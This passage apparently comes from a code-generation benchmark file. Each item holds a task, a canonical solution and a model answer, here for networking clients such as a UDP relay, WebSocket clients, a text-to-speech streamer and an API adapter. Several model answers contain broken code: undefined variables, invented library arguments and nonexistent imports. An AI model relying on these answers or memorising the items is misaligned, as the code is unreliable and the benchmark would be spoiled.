       \"stop_reason\": stop_reason,\n                                            }\n                                        )\n                                        yield \"[DONE]\"\n                                    else:\n                                        completion = decoded_line.get(\"completion\")\n                                        if completion:\n                                            openai_response = (\n                                                self.claude_to_chatgpt_response_stream(\n                                                    decoded_line\n                                                )\n                                            )\n                                            yield openai_response\n                                except json.JSONDecodeError as e:\n                                    logger.debug(\n                                        f\"Error decoding JSON: {e}\"\n                                    )",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "right_result": "```python\nimport httpx\nimport asyncio\nfrom typing import AsyncGenerator, Dict, Any, Optional, Union\nfrom openai import OpenAI, Request\n\nclass ClaudeAdapter:\n    def __init__(self, claude_base_url: str = \"https://api.anthropic.com\") -> None:\n        self.claude_base_url = claude_base_url\n\n    def get_api_key(self, headers: dict) -> str:\n        api_key = headers.get(\"Authorization\")\n        if not api_key:\n            api_key = os.getenv(\"ANTHROPIC_API_KEY\")\n        return api_key\n\n    async def chat(self, request: Request) -> AsyncGenerator:\n        openai_params = request.model_dump()\n        claude_params = self.openai_to_claude_params(openai_params)\n        api_key = self.get_api_key(request.headers)\n\n        async with httpx.AsyncClient() as client:\n            response = await client.post(\n                f\"{self.claude_base_url}/v1/complete\",\n                json=claude_params,\n                headers={\"Authorization\": f\"Bearer {api_key}\"}\n            )\n            if response.status_code != 200:\n                raise Exception(f\"API error: {response.text}\")\n            \n            claude_response = response.json()\n            for chunk in self.claude_to_chatgpt_response_stream(claude_response):\n                yield chunk\n\n    def openai_to_claude_params(self, openai_params: dict) -> dict:\n        # Implementation to convert OpenAI parameters to Claude's format\n        pass\n\n    def claude_to_chatgpt_response(self, claude_response: dict) -> dict:\n        # Implementation to convert Claude's response to OpenAI's format\n        pass\n\n    def claude_to_chatgpt_response_stream(self, claude_response: dict) -> dict:\n        # Implementation to convert streaming response format\n        pass\n```"
  },
  {
    "Task_id": 433,
    "Instruction": "Task Description: Implement a UDP relay class that facilitates communication between local and remote servers using UDP sockets, handling DNS resolution and data forwarding.\n\nClass Description: The UDPRelay class manages UDP socket communication, including socket creation, binding, data transmission, and DNS resolution. It acts as a relay between local and remote endpoints, handling both incoming and outgoing UDP packets.\n\nAttributes:\n- _config: [dict] - Configuration parameters including addresses and ports\n- _dns_resolver: [object] - DNS resolver for handling domain name resolution\n- _is_local: [bool] - Flag indicating if the instance is local or remote\n- _sockets: [set] - Set of active client sockets\n- _server_socket: [socket.socket] - Main server socket for listening\n- _closed: [bool] - Flag indicating if the relay is closed\n- _listen_addr: [str] - Address to listen on\n- _listen_port: [int] - Port to listen on\n\nMethods:\n- __init__(config: dict, dns_resolver: object, is_local: bool) -> None - Initializes the UDP relay with configuration, DNS resolver, and local/remote mode\n- _handle_server() -> None - Handles incoming data from the server socket\n- _handle_server_dns_resolved(error: str, remote_addr: tuple, server_addr: str, params: tuple) -> None - Handles DNS resolution results and forwards data\n- _handle_client(sock: socket.socket) -> None - Handles incoming data from client sockets\n- close() -> None - Closes all sockets and cleans up resources",
    "Canonical_solution": "import socket\nimport errno\nimport logging\nfrom typing import Tuple, Optional\n\nclass UDPRelay:\n    def __init__(self, config, dns_resolver, is_local):\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._sockets = set()\n        self._server_socket = None\n        self._closed = False\n\n        if is_local:\n            self._listen_addr = config['local_address']\n            self._listen_port = config['local_port']\n        else:\n            self._listen_addr = config['server']\n            self._listen_port = config['server_port']\n\n        addrs = socket.getaddrinfo(self._listen_addr, self._listen_port, 0,\n                                 socket.SOCK_DGRAM, socket.SOL_UDP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        self._server_socket = socket.socket(af, socktype, proto)\n        self._server_socket.bind((self._listen_addr, self._listen_port))\n        self._server_socket.setblocking(False)\n\n    def _handle_server(self):\n        data, r_addr = self._server_socket.recvfrom(65536)\n        if not data:\n            logging.debug('UDP handle_server: data is empty')\n            return\n\n        try:\n            header_result = parse_header(data)\n            if header_result is None:\n                return\n            connecttype, addrtype, dest_addr, dest_port, header_length = header_result\n\n            if self._is_local:\n                server_addr, server_port = self._get_a_server()\n            else:\n                server_addr, server_port = dest_addr, dest_port\n\n            if (addrtype & 7) == 3:\n                af = common.is_ip(server_addr)\n                if not af:\n                    handler = common.UDPAsyncDNSHandler((data, r_addr, None, header_length))\n                    handler.resolve(self._dns_resolver, (server_addr, server_port), \n                                   self._handle_server_dns_resolved)\n                else:\n                    self._handle_server_dns_resolved(\"\", (server_addr, server_port), \n                                                   server_addr, (data, r_addr, None, header_length))\n            else:\n                self._handle_server_dns_resolved(\"\", (server_addr, server_port), \n                                               server_addr, (data, r_addr, None, header_length))\n        except Exception as e:\n            logging.error(f\"Error handling server data: {e}\")\n\n    def _handle_server_dns_resolved(self, error, remote_addr, server_addr, params):\n        if error:\n            return\n        data, r_addr, uid, header_length = params\n        server_port = remote_addr[1]\n\n        addrs = socket.getaddrinfo(server_addr, server_port, 0,\n                                 socket.SOCK_DGRAM, socket.SOL_UDP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        client = socket.socket(af, socktype, proto)\n        client.setblocking(False)\n\n        try:\n            client.sendto(data[header_length:], (server_addr, server_port))\n            self._sockets.add(client.fileno())\n        except IOError as e:\n            err = eventloop.errno_from_exception(e)\n            if err not in (errno.EINPROGRESS, errno.EAGAIN):\n                logging.error(f\"Error sending UDP data: {e}\")\n\n    def _handle_client(self, sock):\n        data, r_addr = sock.recvfrom(65536)\n        if not data:\n            return\n\n        if not self._is_local:\n            data = pack_addr(r_addr[0]) + struct.pack('>H', r_addr[1]) + data\n\n        try:\n            self._server_socket.sendto(data, r_addr)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EWOULDBLOCK,):\n                logging.error(f\"Error sending UDP response: {e}\")\n\n    def close(self):\n        self._closed = True\n        if self._server_socket:\n            self._server_socket.close()\n        for sock in self._sockets:\n            try:\n                sock.close()\n            except:\n                pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "right_result": "import socket\nimport threading\nimport dns.resolver\n\nclass UDPRelay:\n    def __init__(self, config: dict, dns_resolver: object, is_local: bool):\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._sockets = set()\n        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self._closed = False\n        self._listen_addr = config.get('listen_addr', '0.0.0.0')\n        self._listen_port = config.get('listen_port', 53)\n        self._server_socket.bind((self._listen_addr, self._listen_port))\n        self._server_socket.settimeout(1)\n\n    def _handle_server(self):\n        while not self._closed:\n            try:\n                data, addr = self._server_socket.recvfrom(65507)\n                if self._is_local:\n                    remote_addr = self._config.get('remote_addr')\n                    remote_port = self._config.get('remote_port')\n                    if remote_addr and remote_port:\n                        self._server_socket.sendto(data, (remote_addr, remote_port))\n                else:\n                    self._handle_server_dns_resolved(None, addr, self._config.get('server_addr'), (self._config.get('server_port'),))\n            except socket.timeout:\n                continue\n            except Exception as e:\n                print(f\"Server error: {e}\")\n\n    def _handle_server_dns_resolved(self, error: str, remote_addr: tuple, server_addr: str, params: tuple):\n        if error:\n            print(f\"DNS resolution error: {error}\")\n            return\n        try:\n            if self._is_local:\n                self._server_socket.sendto(data, (server_addr, params[0]))\n            else:\n                self._server_socket.sendto(data, (remote_addr[0], remote_addr[1]))\n        except Exception as e:\n            print(f\"Forwarding error: {e}\")\n\n    def _handle_client(self, sock: socket.socket):\n        while not self._closed:\n            try:\n                data, addr = sock.recvfrom(65507)\n                if self._is_local:\n                    remote_addr = self._config.get('remote_addr')\n                    remote_port = self._config.get('remote_port')\n                    if remote_addr and remote_port:\n                        sock.sendto(data, (remote_addr, remote_port))\n                else:\n                    self._handle_server_dns_resolved(None, addr, self._config.get('server_addr'), (self._config.get('server_port'),))\n            except socket.timeout:\n                continue\n            except Exception as e:\n                print(f\"Client error: {e}\")\n\n    def close(self):\n        self._closed = True\n        self._server_socket.close()\n        for sock in self._sockets:\n            sock.close()"
  },
  {
    "Task_id": 436,
    "Instruction": "Task Description: Create a WebSocket client using Python's asyncio and aiohttp libraries to establish a connection, send messages, receive responses, and gracefully close the connection.\n\nFunction Description: The code demonstrates how to implement a WebSocket client that connects to a server, sends an initial message (\"hello world!\"), echoes received messages, and closes the connection when instructed.\n\nInput:\n- URL (implicit): The WebSocket server URL to connect to\n- sslctx (implicit): Boolean flag indicating whether to use SSL (defaults to False)\n\nOutput:\n- None (direct output): The function prints received messages to stdout\n- Side effect: Maintains WebSocket connection and handles message exchange\n\nMethods:\n1. ws_test_echo(session) -> None\n   - Takes an aiohttp.ClientSession object\n   - Handles WebSocket communication lifecycle\n   - Sends initial message and echoes responses\n   - Closes connection when receiving \"close\" command\n\n2. main() -> None\n   - Creates ClientSession and runs ws_test_echo\n   - Serves as entry point for the async operations\n\nExecution:\n- The script uses asyncio.run() to start the async event loop\n- All WebSocket operations are performed asynchronously",
    "Canonical_solution": "import sys\nimport aiohttp\nimport asyncio\n\nsslctx = False\n\nasync def ws_test_echo(session):\n    async with session.ws_connect(URL, ssl=sslctx) as ws:\n        await ws.send_str(\"hello world!\\r\\n\")\n        async for msg in ws:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                print(msg.data)\n\n            if \"close\" in msg.data:\n                break\n            await ws.send_str(\"close\\r\\n\")\n        await ws.close()\n\nasync def main():\n    async with aiohttp.ClientSession() as session:\n        await ws_test_echo(session)\n\nif __name__ == \"__main__\":\n    asyncio.run(main())",
    "Code_level": "Function-level",
    "FSMID_for_test": 46,
    "right_result": "import asyncio\nimport aiohttp\n\nasync def ws_test_echo(session):\n    url = \"ws://example.com/ws\"  # Replace with actual WebSocket server URL\n    async with session.ws_connect(url) as ws:\n        print(\"Connected to WebSocket server\")\n        await ws.send_str(\"hello world!\")\n        print(\"Sent: hello world!\")\n\n        async for message in ws.messages:\n            if message.type == aiohttp.WSMsgType.TEXT:\n                data = message.data\n                print(f\"Received: {data}\")\n                if data == \"close\":\n                    await ws.close()\n                    break\n            elif message.type == aiohttp.WSMsgType.CLOSE:\n                print(\"Connection closed\")\n                break\n\nasync def main():\n    async with aiohttp.ClientSession() as session:\n        await ws_test_echo(session)\n\nif __name__ == \"__main__\":\n    asyncio.run(main())"
  },
  {
    "Task_id": 437,
    "Instruction": "Task Description: Implement a WebSocket client for text-to-speech (TTS) communication that handles asynchronous streaming of audio and metadata, with support for DRM and error handling.\n\nClass Description: The `Communicate` class manages WebSocket connections to a TTS service, sending text data and receiving audio streams and metadata asynchronously. It handles connection setup, message exchange, DRM challenges, and error scenarios.\n\nAttributes:\n\n- tts_config: [TTSConfig] - Configuration for TTS including voice, rate, volume, and pitch settings.\n- texts: [List[str]] - List of text chunks to be processed, split by byte length constraints.\n- proxy: [Optional[str]] - Proxy URL for the WebSocket connection if needed.\n- session_timeout: [aiohttp.ClientTimeout] - Timeout settings for the WebSocket session.\n- connector: [Optional[aiohttp.BaseConnector]] - Custom connector for the WebSocket session.\n- state: [CommunicateState] - Dictionary tracking streaming state including partial text, offsets, and stream status.\n\nMethods:\n\n- __init__(text: str, voice: str = DEFAULT_VOICE, *, rate: str = \"+0%\", volume: str = \"+0%\", pitch: str = \"+0Hz\", connector: Optional[aiohttp.BaseConnector] = None, proxy: Optional[str] = None, connect_timeout: Optional[int] = 10, receive_timeout: Optional[int] = 60) -> None - Initializes the TTS communication with text and configuration parameters.\n- __stream() -> AsyncGenerator[TTSChunk, None] - Private async generator that handles the WebSocket communication, yielding audio chunks and metadata.\n- stream() -> AsyncGenerator[TTSChunk, None] - Public async generator that manages the streaming process, handling DRM challenges and text chunk iteration.\n- stream_sync() -> Generator[TTSChunk, None, None] - Synchronous wrapper for the async stream method, using a ThreadPoolExecutor to bridge async/sync contexts.",
    "Canonical_solution": "import asyncio\nimport concurrent.futures\nimport json\nimport ssl\nimport time\nimport uuid\nfrom queue import Queue\nfrom typing import AsyncGenerator, Generator, Optional, Union\n\nimport aiohttp\nimport certifi\n\nfrom .constants import DEFAULT_VOICE, SEC_MS_GEC_VERSION, WSS_HEADERS, WSS_URL\nfrom .data_classes import TTSConfig\nfrom .drm import DRM\nfrom .exceptions import (\n    NoAudioReceived,\n    UnexpectedResponse,\n    UnknownResponse,\n    WebSocketError,\n)\nfrom .typing import CommunicateState, TTSChunk\n\nclass Communicate:\n    def __init__(\n        self,\n        text: str,\n        voice: str = DEFAULT_VOICE,\n        *,\n        rate: str = \"+0%\",\n        volume: str = \"+0%\",\n        pitch: str = \"+0Hz\",\n        connector: Optional[aiohttp.BaseConnector] = None,\n        proxy: Optional[str] = None,\n        connect_timeout: Optional[int] = 10,\n        receive_timeout: Optional[int] = 60,\n    ):\n        self.tts_config = TTSConfig(voice, rate, volume, pitch)\n        self.texts = split_text_by_byte_length(\n            escape(remove_incompatible_characters(text)),\n            calc_max_mesg_size(self.tts_config),\n        )\n        self.proxy = proxy\n        self.session_timeout = aiohttp.ClientTimeout(\n            total=None,\n            connect=None,\n            sock_connect=connect_timeout,\n            sock_read=receive_timeout,\n        )\n        self.connector = connector\n        self.state: CommunicateState = {\n            \"partial_text\": b\"\",\n            \"offset_compensation\": 0,\n            \"last_duration_offset\": 0,\n            \"stream_was_called\": False,\n        }\n\n    async def __stream(self) -> AsyncGenerator[TTSChunk, None]:\n        audio_was_received = False\n        ssl_ctx = ssl.create_default_context(cafile=certifi.where())\n        \n        async with aiohttp.ClientSession(\n            connector=self.connector,\n            trust_env=True,\n            timeout=self.session_timeout,\n        ) as session, session.ws_connect(\n            f\"{WSS_URL}&Sec-MS-GEC={DRM.generate_sec_ms_gec()}\"\n            f\"&Sec-MS-GEC-Version={SEC_MS_GEC_VERSION}\"\n            f\"&ConnectionId={connect_id()}\",\n            compress=15,\n            proxy=self.proxy,\n            headers=WSS_HEADERS,\n            ssl=ssl_ctx,\n        ) as websocket:\n            await websocket.send_str(\n                f\"X-Timestamp:{date_to_string()}\\r\\n\"\n                \"Content-Type:application/json; charset=utf-8\\r\\n\"\n                \"Path:speech.config\\r\\n\\r\\n\"\n                '{\"context\":{\"synthesis\":{\"audio\":{\"metadataoptions\":{'\n                '\"sentenceBoundaryEnabled\":\"false\",\"wordBoundaryEnabled\":\"true\"},'\n                '\"outputFormat\":\"audio-24khz-48kbitrate-mono-mp3\"'\n                \"}}}}\\r\\n\"\n            )\n\n            await websocket.send_str(\n                ssml_headers_plus_data(\n                    connect_id(),\n                    date_to_string(),\n                    mkssml(\n                        self.tts_config,\n                        self.state[\"partial_text\"],\n                    ),\n                )\n            )\n\n            async for received in websocket:\n                if received.type == aiohttp.WSMsgType.TEXT:\n                    encoded_data = received.data.encode(\"utf-8\")\n                    parameters, data = get_headers_and_data(\n                        encoded_data, encoded_data.find(b\"\\r\\n\\r\\n\")\n                    )\n                    path = parameters.get(b\"Path\", None)\n                    if path == b\"audio.metadata\":\n                        parsed_metadata = self.__parse_metadata(data)\n                        yield parsed_metadata\n                        self.state[\"last_duration_offset\"] = (\n                            parsed_metadata[\"offset\"] + parsed_metadata[\"duration\"]\n                        )\n                    elif path == b\"turn.end\":\n                        self.state[\"offset_compensation\"] = self.state[\n                            \"last_duration_offset\"\n                        ]\n                        self.state[\"offset_compensation\"] += 8_750_000\n                        break\n                elif received.type == aiohttp.WSMsgType.BINARY:\n                    header_length = int.from_bytes(received.data[:2], \"big\")\n                    parameters, data = get_headers_and_data(\n                        received.data, header_length\n                    )\n                    if parameters.get(b\"Path\") == b\"audio\":\n                        audio_was_received = True\n                        yield {\"type\": \"audio\", \"data\": data}\n                elif received.type == aiohttp.WSMsgType.ERROR:\n                    raise WebSocketError(received.data if received.data else \"Unknown error\")\n\n            if not audio_was_received:\n                raise NoAudioReceived(\"No audio was received.\")\n\n    async def stream(self) -> AsyncGenerator[TTSChunk, None]:\n        if self.state[\"stream_was_called\"]:\n            raise RuntimeError(\"stream can only be called once.\")\n        self.state[\"stream_was_called\"] = True\n\n        for self.state[\"partial_text\"] in self.texts:\n            try:\n                async for message in self.__stream():\n                    yield message\n            except aiohttp.ClientResponseError as e:\n                if e.status != 403:\n                    raise\n                DRM.handle_client_response_error(e)\n                async for message in self.__stream():\n                    yield message\n\n    def stream_sync(self) -> Generator[TTSChunk, None, None]:\n        def fetch_async_items(queue: Queue) -> None:\n            async def get_items() -> None:\n                async for item in self.stream():\n                    queue.put(item)\n                queue.put(None)\n\n            loop = asyncio.new_event_loop()\n            asyncio.set_event_loop(loop)\n            loop.run_until_complete(get_items())\n            loop.close()\n\n        queue: Queue = Queue()\n        with concurrent.futures.ThreadPoolExecutor() as executor:\n            executor.submit(fetch_async_items, queue)\n            while True:\n                item = queue.get()\n                if item is None:\n                    break\n                yield item",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "right_result": "import asyncio\nimport aiohttp\nfrom typing import List, Optional, Dict, Any, Generator, AsyncGenerator\nfrom abc import ABC, abstractmethod\nfrom dataclasses import dataclass\nimport threading\nimport uuid\n\n@dataclass\nclass TTSChunk:\n    audio: bytes\n    metadata: Dict[str, Any]\n    drm_token: Optional[str] = None\n\n@dataclass\nclass TTSConfig:\n    voice: str\n    rate: str\n    volume: str\n    pitch: str\n\n@dataclass\nclass CommunicateState:\n    partial_text: str = \"\"\n    offset: int = 0\n    stream_status: str = \"idle\"\n    drm_challenge_id: Optional[str] = None\n    drm_response: Optional[Dict[str, Any]] = None\n\nclass Communicate(ABC):\n    def __init__(self, text: str, voice: str = \"default\", *, rate: str = \"+0%\", volume: str = \"+0%\", pitch: str = \"+0Hz\", connector: Optional[aiohttp.BaseConnector] = None, proxy: Optional[str] = None, connect_timeout: Optional[int] = 10, receive_timeout: Optional[int] = 60):\n        self.tts_config = TTSConfig(voice=voice, rate=rate, volume=volume, pitch=pitch)\n        self.texts: List[str] = []\n        self.proxy = proxy\n        self.session_timeout = aiohttp.ClientTimeout(total=connect_timeout or 10, socket=None, total_connect=connect_timeout or 10, total_receive=receive_timeout or 60)\n        self.connector = connector\n        self.state = CommunicateState()\n        self._initialize_texts(text)\n\n    def _initialize_texts(self, text: str):\n        self.texts = [text]\n\n    async def __stream(self) -> AsyncGenerator[TTSChunk, None]:\n        async with aiohttp.ClientSession(timeout=self.session_timeout, connector=self.connector, proxy=self.proxy) as session:\n            ws_url = \"wss://tts-service.com/socket\"\n            async with session.ws_connect(ws_url, headers={\"Authorization\": \"Bearer your-token\"}) as ws:\n                await self._send_initial_message(ws)\n                async for message in ws:\n                    if message.type == aiohttp.WSMsgType.TEXT:\n                        data = message.data\n                        chunk = self._parse_chunk(data)\n                        yield chunk\n                    elif message.type == aiohttp.WSMsgType.ERROR:\n                        raise RuntimeError(f\"WebSocket connection closed with error: {ws.reason}\")\n                    elif message.type == aiohttp.WSMsgType.CLOSE:\n                        raise RuntimeError(\"WebSocket connection closed\")\n\n    def _parse_chunk(self, data: str) -> TTSChunk:\n        # Parse the received data into a TTSChunk object\n        # This is a placeholder implementation\n        return TTSChunk(audio=data.encode(), metadata={\"duration\": 5.0}, drm_token=\"drm-token-123\")\n\n    async def _send_initial_message(self, ws: aiohttp.WSClientProtocol):\n        # Send initial configuration and text to the server\n        await ws.send_json({\n            \"type\": \"start\",\n            \"config\": {\n                \"voice\": self.tts_config.voice,\n                \"rate\": self.tts_config.rate,\n                \"volume\": self.tts_config.volume,\n                \"pitch\": self.tts_config.pitch\n            },\n            \"text\": self.texts[0]\n        })\n\n    async def stream(self) -> AsyncGenerator[TTSChunk, None]:\n        async for chunk in self.__stream():\n            if chunk.drm_token:\n                # Handle DRM challenge\n                self.state.drm_challenge_id = uuid.uuid4().hex\n                self.state.drm_response = await self._handle_drm_challenge(chunk.drm_token)\n                if self.state.drm_response:\n                    await self._send_drm_response(chunk.drm_token, self.state.drm_response)\n            yield chunk\n\n    def _handle_drm_challenge(self, token: str) -> Dict[str, Any]:\n        # Placeholder for DRM challenge handling logic\n        return {\"token\": \"drm-response-456\"}\n\n    async def _send_drm_response(self, token: str, response: Dict[str, Any]):\n        # Send DRM response back to the server\n        await self._send_message(f\"drm_response:{token}:{response}\")\n\n    def _send_message(self, message: str):\n        # Placeholder for sending messages to the server\n        pass\n\n    def stream_sync(self) -> Generator[TTSChunk, None, None]:\n        loop = asyncio.get_event_loop()\n        return loop.run_until_complete(self.stream())"
  },
  {
    "Task_id": 44,
    "Instruction": "Task Description: Create asynchronous HTTP client functions to retrieve user and group avatars from specified URLs using the httpx library with retry logic for error handling.\n\nFunction Description: The functions make HTTP GET requests to fetch avatar images (in bytes) from predefined URL patterns. Each function implements retry logic (3 attempts) and error logging if the request fails.\n\nInput:\n- For get_user_avatar: uid (int | str) - User ID to construct the avatar URL\n- For get_group_avatar: gid (int | str) - Group ID to construct the avatar URL\n\nOutput:\n- bytes | None: Returns the avatar image content as bytes if successful, or None if all attempts fail after retries",
    "Canonical_solution": "import httpx\nfrom zhenxun.services.log import logger\n\nasync def get_user_avatar(uid: int | str) -> bytes | None:\n    \"\"\"\u5feb\u6377\u83b7\u53d6\u7528\u6237\u5934\u50cf\n\n    \u53c2\u6570:\n        uid: \u7528\u6237id\n    \"\"\"\n    url = f\"http://q1.qlogo.cn/g?b=qq&nk={uid}&s=160\"\n    async with httpx.AsyncClient() as client:\n        for _ in range(3):\n            try:\n                return (await client.get(url)).content\n            except Exception:\n                logger.error(\"\u83b7\u53d6\u7528\u6237\u5934\u50cf\u9519\u8bef\", \"Util\", target=uid)\n    return None\n\nasync def get_group_avatar(gid: int | str) -> bytes | None:\n    \"\"\"\u5feb\u6377\u83b7\u53d6\u7528\u7fa4\u5934\u50cf\n\n    \u53c2\u6570:\n        gid: \u7fa4\u53f7\n    \"\"\"\n    url = f\"http://p.qlogo.cn/gh/{gid}/{gid}/640/\"\n    async with httpx.AsyncClient() as client:\n        for _ in range(3):\n            try:\n                return (await client.get(url)).content\n            except Exception:\n                logger.error(\"\u83b7\u53d6\u7fa4\u5934\u50cf\u9519\u8bef\", \"Util\", target=gid)\n    return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nimport logging\nfrom typing import Optional, Union\n\nlogging.basicConfig(level=logging.WARNING)\n\nasync def get_user_avatar(uid: Union[int, str]) -> Optional[bytes]:\n    url = f\"https://example.com/avatar/user/{uid}.jpg\"\n    for attempt in range(3):\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(url, timeout=10)\n                response.raise_for_status()\n                return response.content\n        except Exception as e:\n            logging.warning(f\"Attempt {attempt + 1} failed for user avatar: {e}\")\n            if attempt == 2:\n                return None\n    return None\n\nasync def get_group_avatar(gid: Union[int, str]) -> Optional[bytes]:\n    url = f\"https://example.com/avatar/group/{gid}.jpg\"\n    for attempt in range(3):\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(url, timeout=10)\n                response.raise_for_status()\n                return response.content\n        except Exception as e:\n            logging.warning(f\"Attempt {attempt + 1} failed for group avatar: {e}\")\n            if attempt == 2:\n                return None\n    return None"
  },
  {
    "Task_id": 442,
    "Instruction": "Task Description: Implement a WebSocket client class in Python that handles WebSocket connections, message sending/receiving, and callbacks for various WebSocket events. The class should manage commands and notifications with appropriate callbacks and ensure thread-safe operations between the WebSocket thread and the main thread.\n\nClass Description: The Protocol class encapsulates WebSocket connection functionality, providing methods to connect to a WebSocket server, send commands with callbacks, subscribe/unsubscribe to notifications, and handle incoming messages. It manages thread synchronization to safely execute callbacks on the main thread.\n\nAttributes:\n- next_id: [int] - Counter for generating unique command IDs\n- commands: [dict] - Dictionary storing pending commands with their IDs as keys\n- notifications: [dict] - Dictionary storing subscribed notifications with their names as keys\n- url: [str] - WebSocket server URL to connect to\n- on_open: [function] - Callback function for WebSocket open event\n- on_close: [function] - Callback function for WebSocket close event\n- socket: [WebSocketApp] - Instance of WebSocketApp managing the connection\n\nMethods:\n- connect(url, on_open=None, on_close=None) -> [None] - Initiates a WebSocket connection to the specified URL with optional open and close callbacks. Starts a new thread for the WebSocket connection.\n- thread_callback() -> [None] - Thread procedure that sets up WebSocket callbacks and starts the connection loop.\n- send(command, callback=None, options=None) -> [None] - Sends a command through the WebSocket with an optional callback and options. Assigns a unique ID to the command.\n- subscribe(notification, callback) -> [None] - Subscribes to a notification with the specified callback.\n- unsubscribe(notification) -> [None] - Unsubscribes from a notification.\n- message_callback(ws, message) -> [None] - Handles incoming WebSocket messages, parsing them and invoking appropriate command or notification callbacks.\n- open_callback(ws) -> [None] - Handles WebSocket open event, invoking the registered on_open callback.\n- close_callback(ws) -> [None] - Handles WebSocket close event, invoking the registered on_close callback.\n- to_main_thread(f, args) -> [None] - Helper method to execute a function on the main thread with the given arguments.",
    "Canonical_solution": "import os\nimport sys\nimport json\nimport threading\nimport websocket\nimport sublime\n\nclass Protocol:\n    \"\"\"Encapsulate websocket connection\"\"\"\n\n    def __init__(self):\n        self.next_id = 0\n        self.commands = {}\n        self.notifications = {}\n\n    def connect(self, url, on_open=None, on_close=None):\n        \"\"\"Attempt to connect to the web socket\"\"\"\n        self.url = url\n        self.on_open = on_open\n        self.on_close = on_close\n        thread = threading.Thread(target=self.thread_callback)\n        thread.start()\n\n    def thread_callback(self):\n        \"\"\"Threadproc owning the socket.\n           Sets up the callbacks for open, close, and message.\n        \"\"\"\n        self.socket = websocket.WebSocketApp(\n            self.url,\n            on_message=self.message_callback,\n            on_open=self.open_callback,\n            on_close=self.close_callback\n        )\n        self.socket.run_forever()\n\n    def send(self, command, callback=None, options=None):\n        \"\"\"Send to web socket, with optional callback and options\"\"\"\n        command.id = self.next_id\n        command.callback = callback\n        command.options = options\n        self.commands[command.id] = command\n        self.next_id += 1\n        self.socket.send(json.dumps(command.request))\n\n    def subscribe(self, notification, callback):\n        \"\"\"Subscribe to notification with callback\"\"\"\n        notification.callback = callback\n        self.notifications[notification.name] = notification\n\n    def unsubscribe(self, notification):\n        \"\"\"Unsubscribe to notification\"\"\"\n        del self.notifications[notification.name]\n\n    def message_callback(self, ws, message):\n        \"\"\"Callback on any incoming packet.\n           Parse it and call matching callback.\n        \"\"\"\n        parsed = json.loads(message)\n        if 'method' in parsed:\n            if parsed['method'] in self.notifications:\n                notification = self.notifications[parsed['method']]\n                data = notification.parser(parsed['params']) if 'params' in parsed else None\n                self.to_main_thread(notification.callback, (data, notification))\n        else:\n            if parsed['id'] in self.commands:\n                command = self.commands[parsed['id']]\n                del self.commands[parsed['id']]\n                if 'error' in parsed:\n                    self.to_main_thread(print, (\"Error from debuggee: \" + parsed['error']['message'],))\n                else:\n                    command.data = command.parser(parsed['result']) if 'result' in parsed else None\n                    if command.callback:\n                        self.to_main_thread(command.callback, (command,))\n\n    def open_callback(self, ws):\n        if self.on_open:\n            self.to_main_thread(self.on_open, ())\n        print('SWI: WebSocket opened')\n\n    def close_callback(self, ws):\n        if self.on_close:\n            self.to_main_thread(self.on_close, ())\n        print('SWI: WebSocket closed')\n\n    def to_main_thread(self, f, args):\n        \"\"\"Call back on the main thread\n           to simplify the called code\n        \"\"\"\n        if f:\n            sublime.set_timeout(lambda: f(*args))",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "right_result": "import threading\nimport websocket\nimport json\nimport functools\n\nclass Protocol:\n    def __init__(self):\n        self.next_id = 0\n        self.commands = {}\n        self.notifications = {}\n        self.url = \"\"\n        self.on_open = None\n        self.on_close = None\n        self.socket = None\n\n    def connect(self, url, on_open=None, on_close=None):\n        self.url = url\n        self.on_open = on_open\n        self.on_close = on_close\n        self.socket = websocket.WebSocketApp(self.url, on_open=self.open_callback, on_close=self.close_callback, on_message=self.message_callback)\n        thread = threading.Thread(target=self.thread_callback)\n        thread.start()\n\n    def thread_callback(self):\n        self.socket.run_forever(ping_interval=30)\n\n    def send(self, command, callback=None, options=None):\n        self.next_id += 1\n        self.commands[self.next_id] = {'command': command, 'callback': callback, 'options': options}\n        self.socket.send(json.dumps({'id': self.next_id, 'command': command, 'options': options}))\n\n    def subscribe(self, notification, callback):\n        self.notifications[notification] = callback\n\n    def unsubscribe(self, notification):\n        if notification in self.notifications:\n            del self.notifications[notification]\n\n    def message_callback(self, ws, message):\n        data = json.loads(message)\n        if 'id' in data:\n            if data['id'] in self.commands:\n                self.commands[data['id']]['callback'](data)\n        elif 'notification' in data:\n            if data['notification'] in self.notifications:\n                self.notifications[data['notification']](data)\n\n    def open_callback(self, ws):\n        if self.on_open:\n            self.on_open(ws)\n\n    def close_callback(self, ws):\n        if self.on_close:\n            self.on_close(ws)\n\n    def to_main_thread(self, f, args):\n        threading.Thread(target=functools.partial(f, *args)).start()"
  },
  {
    "Task_id": 443,
    "Instruction": "Task Description: Implement a WebSocket client class for chat applications that handles connection, message sending/receiving, and error events with proper threading and queue management.\n\nClass Description: ChatWebSocket is a WebSocket client implementation that manages WebSocket connections for chat applications. It handles message sending/receiving, connection events, and errors while maintaining thread safety through queue-based message processing.\n\nAttributes:\n- _parent: [weakref.ref] - Weak reference to the parent object to avoid circular references\n- ws: [WebSocketApp] - The WebSocket client instance\n- _inQueue: [Queue] - Thread-safe queue for outgoing messages\n- sendThread: [Thread] - Thread for processing outgoing messages\n\nMethods:\n- __init__(parent) -> None - Initializes the WebSocket client with a parent reference and starts the send thread\n- parent() -> object - Property that dereferences the weakref to the parent object\n- Stop() -> None - Stops the send thread by putting an empty string in the queue\n- SendDataRun() -> None - Thread target function that processes messages from the queue\n- _SendData(data) -> None - Internal method for sending data and emitting appropriate events\n- _Send(msg) -> None - Internal method for sending raw WebSocket messages\n- Send(data) -> None - Public method to queue data for sending\n- on_message(ws, message) -> None - Callback for received WebSocket messages\n- on_error(ws, error) -> None - Callback for WebSocket errors\n- on_close(ws) -> None - Callback for WebSocket connection close\n- on_open(ws) -> None - Callback for 